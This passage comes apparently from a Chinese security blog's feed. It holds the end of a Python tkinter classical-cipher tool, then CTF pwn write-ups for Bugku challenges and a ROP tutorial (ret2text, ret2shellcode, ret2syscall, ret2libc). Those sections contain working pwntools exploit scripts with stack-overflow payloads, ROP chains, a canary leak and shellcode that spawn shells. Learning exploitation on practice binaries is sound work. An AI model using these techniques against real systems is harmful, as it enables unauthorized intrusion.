plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    n = <span class="number">0</span>  <span class="comment"># 记录读取字符的位置</span></span><br><span class="line">    m = <span class="number">0</span>  <span class="comment"># 记录读取密钥的位置</span></span><br><span class="line">    output.delete(<span class="number">0</span>, <span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    ciphertext = entry_frame.get()</span><br><span class="line">    key = key_frame.get()</span><br><span class="line">    <span class="keyword">if</span> key.isalpha():</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ciphertext:</span><br><span class="line">            <span class="keyword">if</span> ciphertext[n].isalpha():</span><br><span class="line">                <span class="keyword">if</span> ciphertext[n].isupper():  <span class="comment"># 判断是否为大写字母</span></span><br><span class="line">                    plaintext += alpha[father_list[</span><br><span class="line">                        <span class="built_in">ord</span>(key[m % <span class="built_in">len</span>(key)]) - <span class="number">97</span>].index(</span><br><span class="line">                            ciphertext[n].lower())].upper()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    plaintext += alpha[father_list[<span class="built_in">ord</span>(key[m % <span class="built_in">len</span>(key)]) -</span><br><span class="line">                                                   <span class="number">97</span>].index(ciphertext[n])]</span><br><span class="line">                m += <span class="number">1</span></span><br><span class="line">                n += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment">#如果不是字符就照常输出</span></span><br><span class="line">                plaintext += i</span><br><span class="line">                n += <span class="number">1</span></span><br><span class="line">        output.insert(<span class="number">0</span>, plaintext)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        Error()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># base64加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Base64_Encryption</span>():</span></span><br><span class="line">    output.delete(<span class="number">0</span>, <span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    plaintext = entry_frame.get()</span><br><span class="line">    output.insert(<span class="number">0</span>, base64.b64encode(plaintext.encode(<span class="string">&#x27;UTF-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># base64解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Base64_Decrypt</span>():</span></span><br><span class="line">    output.delete(<span class="number">0</span>, <span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ciphertext = entry_frame.get()</span><br><span class="line">        output.insert(<span class="number">0</span>, base64.b64decode(ciphertext.encode(<span class="string">&#x27;UTF-8&#x27;</span>)))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        Error_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误密钥警报</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Error</span>():</span></span><br><span class="line">    messagebox.showwarning(title=<span class="string">&#x27;Wrong!&#x27;</span>, message=<span class="string">&#x27;Wrong key!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误输入警报</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Error_input</span>():</span></span><br><span class="line">    messagebox.showwarning(title=<span class="string">&#x27;Wrong!&#x27;</span>, message=<span class="string">&#x27;Wrong input!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">window = tk.Tk()</span><br><span class="line">window.title(<span class="string">&#x27;Secert&#x27;</span>)  <span class="comment"># 设置窗口标题</span></span><br><span class="line">window.geometry(<span class="string">&#x27;500x500&#x27;</span>)  <span class="comment"># 设置窗口大小</span></span><br><span class="line">entry_name = tk.Label(window, text=<span class="string">&quot;Plaintext/Ciphertext:&quot;</span>)</span><br><span class="line">entry_name.place(relx=<span class="number">0.12</span>, rely=<span class="number">0.05</span>, anchor=tk.CENTER)  <span class="comment"># 放置输入窗口文字</span></span><br><span class="line">entry_frame = tk.Entry(window)  <span class="comment"># 设置输入框</span></span><br><span class="line">entry_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.05</span>, anchor=tk.CENTER, width=<span class="number">200</span>,</span><br><span class="line">                  height=<span class="number">25</span>)  <span class="comment"># 放置输入窗口</span></span><br><span class="line">key_name = tk.Label(window, text=<span class="string">&quot;key:&quot;</span>)  <span class="comment"># 设置密钥窗口文字</span></span><br><span class="line">key_name.place(relx=<span class="number">0.12</span>, rely=<span class="number">0.12</span>, anchor=tk.CENTER)</span><br><span class="line">Virginia_name = tk.Label(window, text=<span class="string">&quot;Virginia:&quot;</span>)</span><br><span class="line">Virginia_name.place(relx=<span class="number">0.12</span>, rely=<span class="number">0.2</span>, anchor=tk.CENTER)</span><br><span class="line">Caesar_name = tk.Label(window, text=<span class="string">&quot;Caesar:&quot;</span>)</span><br><span class="line">Caesar_name.place(relx=<span class="number">0.12</span>, rely=<span class="number">0.4</span>, anchor=tk.CENTER)</span><br><span class="line">Base64_name = tk.Label(window, text=<span class="string">&quot;Base64:&quot;</span>)</span><br><span class="line">Base64_name.place(relx=<span class="number">0.12</span>, rely=<span class="number">0.6</span>, anchor=tk.CENTER)</span><br><span class="line">key_frame = tk.Entry(window)</span><br><span class="line">key_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.12</span>, anchor=tk.CENTER, width=<span class="number">200</span>,</span><br><span class="line">                height=<span class="number">25</span>)  <span class="comment"># 放置密钥窗口</span></span><br><span class="line">output_name = tk.Label(window, text=<span class="string">&#x27;Output:&#x27;</span>)</span><br><span class="line">output_name.place(relx=<span class="number">0.12</span>, rely=<span class="number">0.9</span>, anchor=tk.CENTER)</span><br><span class="line">output = tk.Entry(window)</span><br><span class="line">output.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.9</span>, anchor=tk.CENTER, width=<span class="number">200</span>, height=<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 维吉尼亚加密按钮</span></span><br><span class="line">bottom_Virginia_Encryption = tk.Button(window,</span><br><span class="line">                                       text=<span class="string">&#x27;Virginia_Encryption&#x27;</span>,</span><br><span class="line">                                       width=<span class="number">15</span>,</span><br><span class="line">                                       height=<span class="number">2</span>,</span><br><span class="line">                                       command=Virginia_Encryption)  <span class="comment"># 设置加密按钮</span></span><br><span class="line">bottom_Virginia_Encryption.place(relx=<span class="number">0.35</span>, rely=<span class="number">0.2</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 维吉尼亚解密按钮</span></span><br><span class="line">bottom_Virginia_Decrypt = tk.Button(window,</span><br><span class="line">                                    text=<span class="string">&#x27;Virginia_Decrypt&#x27;</span>,</span><br><span class="line">                                    width=<span class="number">15</span>,</span><br><span class="line">                                    height=<span class="number">2</span>,</span><br><span class="line">                                    command=Virginia_Decrypt)  <span class="comment"># 设置解密按钮</span></span><br><span class="line">bottom_Virginia_Decrypt.place(relx=<span class="number">0.65</span>, rely=<span class="number">0.2</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 凯撒加密按钮</span></span><br><span class="line">bottom_Caesar_Encryption = tk.Button(window,</span><br><span class="line">                                     text=<span class="string">&#x27;Caesar_Encryption&#x27;</span>,</span><br><span class="line">                                     width=<span class="number">15</span>,</span><br><span class="line">                                     height=<span class="number">2</span>,</span><br><span class="line">                                     command=Caesar_Encryption)  <span class="comment"># 设置加密按钮</span></span><br><span class="line">bottom_Caesar_Encryption.place(relx=<span class="number">0.35</span>, rely=<span class="number">0.4</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 凯撒解密按钮</span></span><br><span class="line">bottom_Caesar_Decrypt = tk.Button(window,</span><br><span class="line">                                  text=<span class="string">&#x27;Caesar_Decrypt&#x27;</span>,</span><br><span class="line">                                  width=<span class="number">15</span>,</span><br><span class="line">                                  height=<span class="number">2</span>,</span><br><span class="line">                                  command=Caesar_Decrypt)  <span class="comment"># 设置加密按钮</span></span><br><span class="line">bottom_Caesar_Decrypt.place(relx=<span class="number">0.65</span>, rely=<span class="number">0.4</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64加密按钮</span></span><br><span class="line">bottom_Base64_Encryption = tk.Button(window,</span><br><span class="line">                                     text=<span class="string">&#x27;Base64_Encryption&#x27;</span>,</span><br><span class="line">                                     width=<span class="number">15</span>,</span><br><span class="line">                                     height=<span class="number">2</span>,</span><br><span class="line">                                     command=Base64_Encryption)  <span class="comment"># 设置加密按钮</span></span><br><span class="line">bottom_Base64_Encryption.place(relx=<span class="number">0.35</span>, rely=<span class="number">0.6</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64解密按钮</span></span><br><span class="line">bottom_Base64_Decrypt = tk.Button(window,</span><br><span class="line">                                  text=<span class="string">&#x27;Base64_Decrypt&#x27;</span>,</span><br><span class="line">                                  width=<span class="number">15</span>,</span><br><span class="line">                                  height=<span class="number">2</span>,</span><br><span class="line">                                  command=Base64_Decrypt)  <span class="comment"># 设置加密按钮</span></span><br><span class="line">bottom_Base64_Decrypt.place(relx=<span class="number">0.65</span>, rely=<span class="number">0.6</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line">window.mainloop()  <span class="comment"># 重复循环</span></span><br></pre></td></tr></table></figure><p>效果图</p><p><img src="https://i.loli.net/2021/09/11/FMquZhiCHwQ51dJ.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku pwn</title>
      <link href="/post/Bugku-PWN.html"/>
      <url>/post/Bugku-PWN.html</url>
      
        <content type="html"><![CDATA[<h1 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h1><p>check一下可以看到是64位程序，什么保护也没开，IDA查看，可以看到存在明显的栈溢出<img src="https://i.loli.net/2021/07/04/DjJPLQ2rEX34dvp.png" alt="屏幕截图 2021-07-04 191959.png"></p><p>再看函数窗口，可以看见存在一个可疑的函数，点进去可以发现是一个后门函数</p><p><img src="https://i.loli.net/2021/07/04/5kmnKT92g1wJoLD.png" alt="屏幕截图 2021-07-04 193304.png"></p><p>所以思路就是利用栈溢出跳转到后门函数，这样就可以得到flag</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x400769</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="overflow2"><a href="#overflow2" class="headerlink" title="overflow2"></a>overflow2</h1><p>check一下，64位开了NX保护。IDA查看，存在溢出<img src="https://i.loli.net/2021/07/04/onJhAYKWN8Sws5m.png" alt="屏幕截图 2021-07-04 205321.png"></p><p>在函数窗口发现system函数，在字符串窗口发现bin/sh。可以利用ROP来获得shell<img src="https://i.loli.net/2021/07/04/3uyO7WHgLIjaEdX.png" alt="image.png"></p><p>找到gadget的地址<img src="https://i.loli.net/2021/07/04/CGgJonulcmIMpwt.png" alt="image.png"></p><p>构建payload就可以了</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn5&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;114.67.246.176&quot;</span>,<span class="number">15097</span>)</span><br><span class="line">sys_addr = <span class="number">0x401050</span></span><br><span class="line">bin_sh = <span class="number">0x402004</span></span><br><span class="line">pop_rdi = <span class="number">0x40126b</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="read-note"><a href="#read-note" class="headerlink" title="read_note"></a>read_note</h1><p>签到题，直接可以获得flag</p><h1 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h1><p>看题目就知道是考canary，check一下，发现是一个64位程序，开了canary和NX保护<img src="https://i.loli.net/2021/07/03/4kYTmvGypHW5uA1.png" alt="image.png"></p><p>查看一下伪代码，很明显，存在栈溢出漏洞，read可以读取0x300字节，但缓冲区只有0x240字节空间<img src="https://i.loli.net/2021/07/03/MjuLO6KPTU42YZH.png" alt="image.png"></p><p>查看字符串，发现存在bin/sh，在函数表里面也存在system函数<img src="https://i.loli.net/2021/07/03/YjeM5z9T8chxFtN.png" alt="屏幕截图 2021-07-03 222006.png"></p><p>所以思路大概出来了，利用gadgets来获取shell。接下来就是思考如何解决canary保护，观察伪代码，里面有printf函数，我们可以利用printf函数来泄露canary，printf函数输出时会以x00为输出结尾，只要我们将canary值的x00覆盖掉就可以泄露了。</p><p>所以，第一步，获取gadgets。因为是64位程序，所以传参时前六个参数是利用rdi, rsi, rdx, rcx, r8, r9寄存器来传递，所以需要将bin/sh传递到rdi寄存器。<img src="https://i.loli.net/2021/07/03/2RT6YD3ZijuXmnK.png" alt="image.png"></p><p>接下来就是泄露canary，buf的偏移量是0x240-8(减8是因为canary的值在ebp减8的位置)，之后利用printf函数泄露即可。<img src="https://i.loli.net/2021/07/03/B8UpxXibkZD2VlI.png" alt="image.png"></p><p>最后再组装一下就可以得出exp了。</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn4_&#x27;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x400963</span></span><br><span class="line">binsh = <span class="number">0x601068</span></span><br><span class="line">sys = <span class="number">0x40080C</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x240</span> - <span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please leave your name(Within 36 Length):&#x27;</span>, payload)</span><br><span class="line">p.recvline()</span><br><span class="line">canary = p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> canary</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x210</span> - <span class="number">8</span>) + canary + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Please leave a message(Within 0x200 Length):&#x27;</span> , payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP</title>
      <link href="/post/ROP.html"/>
      <url>/post/ROP.html</url>
      
        <content type="html"><![CDATA[<h1 id="ROP原理"><a href="#ROP原理" class="headerlink" title="ROP原理"></a>ROP原理</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul><p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></h1><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>控制程序执行程序本身已有的的代码 (.text)</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先查看附件，32位可执行文件且只开了NX保护</p><p><img src="https://i.loli.net/2021/06/06/TX1cHdubI45RlPp.png" alt="image.png"></p><p>利用IDA查看伪代码，可以看到，主函数存在栈溢出漏洞<img src="https://i.loli.net/2021/06/06/i4CJDosGfOb1TEQ.png" alt="image.png"></p><p>不仅如此，在secure函数中发现了系统调用，其地址为0x0804863A，所以我们可以利用secure函数的代码来获取系统的shell<img src="https://i.loli.net/2021/06/06/Wsz8ARtm6n4LYIa.png" alt="image.png"></p><p>接下来就是计算s的偏移量。设置断点0x08048641，进行调试</p><p>可以看到，esp指向地址为0xffffcf70，ebp指向地址为0xffffcff8，因为s的地址为esp+0x1c，所以s相当于ebp的偏移量为：0xffffcff8-0xffffcf70-0x1c=0x6c，s相当于返回地址的偏移量为： 0x6c+4<img src="https://i.loli.net/2021/06/06/KFQVS5bCJfePYTs.png" alt="image.png"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;A&#x27;</span> * (<span class="number">0x6c</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></h1><h2 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h2><p>程序执行我们自己填充的shellcode代码</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>按照ret2text思路，发现存在栈溢出，计算出s相对于返回地址的偏移量为112。查看字符串，并没有发现system函数，但是我们发现我们输入的字符串会复制到buf2，所以我们可以利用buf2构造shellcode代码，<img src="https://i.loli.net/2021/06/06/QbU3YlyvFrws2V8.png" alt="image.png"><img src="https://i.loli.net/2021/06/06/3lnkurmIjBxszJG.png" alt="image.png"></p><p>先判断一下buf2所在地址是否可执行。利用IDA查看buf2的地址<img src="https://i.loli.net/2021/06/06/aVwCQ9mclOuWKdY.png" alt="image.png"></p><p>在查看一下这个地址是否可执行。发现这个地址可读可写可执行。<img src="https://i.loli.net/2021/06/06/xFsyLRJPEoZ4YfS.png" alt="image.png"></p><p>之后构建payload</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf2 = <span class="number">0x804A080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="string">&quot;&quot;&quot;解释一下&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;shellcraft.sh作用是生成好system(&quot;bin/sh&quot;)的代码&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;asm函数是将代码转成机器指令&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;ljust函数作用就是向右对其并用给定字符补充字符串&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2syscall</a></h1><h2 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h2><p>控制程序执行系统调用，获取 shell。</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>先查看附件</p><p><img src="https://i.loli.net/2021/06/06/E548xu9R7JOXjph.png" alt="image.png"></p><p>接下来利用 IDA 来查看源码，并没有system函数，而且也没有bin/sh字符<img src="https://i.loli.net/2021/06/06/Ih4PmFtxo63OgBn.png" alt="image.png"></p><p>可以看到，函数存在栈溢出，接下来就是计算v4的偏移量。先设置断点，将断点设置在调用gets函数那里<img src="https://i.loli.net/2021/06/06/mgMuoesVOpEzWXQ.png" alt="image.png"></p><p>接下来就是调试。可以看到esp指向地址0xffffcf80，v4的地址为esp+1c，ebp指向的地址0xffffd008，由此可以计算出v4的偏移量为0xffffd008-0xffffcf80-0x1c=108，所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。<img src="https://i.loli.net/2021/06/06/qzpYFsk2cQNmg14.png" alt="image.png"></p><p>此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。（<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">系统调用基本知识</a>）我们可以通过执行 int 0x80 来执行对应的系统调用。对于这道题，我们可以使用这个系统调用**execve(“/bin/sh”,NULL,NULL)**，其中，该程序是 32 位，这个系统调用需要满足的条件：</p><ul><li>系统调用号，即 eax 应该为 0xb（是指系统调用编号）</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>为满足这些条件，我们可以使用 gadgets来完成。如利用堆栈对寄存器赋值，先将10存入栈中，再pop eax。所以，接下来就是寻找符合条件的gadgets。（<a href="https://www.wangan.com/docs/678">ROPgadget安装与使用方法</a>）<img src="https://i.loli.net/2021/06/06/lExnp75bSDTwsyi.png" alt="image.png"></p><p>接下来就是组装：**payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])**，其中 0xb 为 execve 对应的系统调用号。</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">bin_sh = <span class="number">0x80be408</span></span><br><span class="line">payload =<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>+p32(pop_eax_ret)+ p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(int_0x80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></h1><h2 id="方法-3"><a href="#方法-3" class="headerlink" title="方法"></a>方法</h2><p>利用gadgets构建ROP获取shell</p><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>check一下32位程序，且只开了NX保护</p><p><img src="https://i.loli.net/2021/07/12/T7UivSYopaZFkxK.png" alt="image.png"></p><p>丢进IDA，查看伪代码，存在gets函数，很明显存在栈溢出<img src="https://i.loli.net/2021/07/12/Z6y1jb4Rx7zoien.png" alt="image.png"></p><p>查看函数列表以及字符串列表，很明显可以构建ROP<img src="https://i.loli.net/2021/07/12/R49gkfUZyHouv3e.png" alt="屏幕截图 2021-07-12 101906.png"></p><p>最后就是计算偏移量。s的偏移量0xffffcfb8-ffffcf4c=6c，相对于返回地址的偏移量6c+4<img src="https://i.loli.net/2021/07/12/j4w8hMAQ1ntcyfp.png" alt="image.png"></p><h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">sys_addr = <span class="number">0x8048460</span></span><br><span class="line">bin_sh = <span class="number">0x08048720</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(sys_addr)+p32(<span class="number">0x11111111</span>)+p32(bin_sh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">&quot;&quot;&quot;因为调用system函数中途需要一个返回地址，而直接利用system gadget会导致缺失返回地址，所以需要一个虚拟地址p32(0x11111111)&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></h1><p>ida查看，可以看到这里有system函数，但是没有bin/sh，但是这里有gets函数，我们可以利用gets函数传入bin/sh字符，从而利用system获取shell</p><p><img src="https://i.loli.net/2021/08/30/lJf9ZiPbnCsWDQq.png" alt="屏幕截图 2021-08-30 093824.png"></p><p><img src="https://i.loli.net/2021/08/30/n2o6rlDEY1vsKhH.png" alt="image.png"></p><p>计算好偏移，将通过gets获取的字符存入到bss段可写区域</p><p><img src="https://i.loli.net/2021/08/30/XRCi8KrmfosnlcY.png" alt="屏幕截图 2021-08-30 105444.png"></p><h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">sys_addr = <span class="number">0x08048490</span></span><br><span class="line">bss = <span class="number">0x804a000</span></span><br><span class="line">gets_addr = <span class="number">0x8048460</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>+p32(gets_addr)+p32(pop_ebx)+p32(bss)+p32(sys_addr)+<span class="string">&#x27;bbbb&#x27;</span>+p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall">https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 积累 </tag>
            
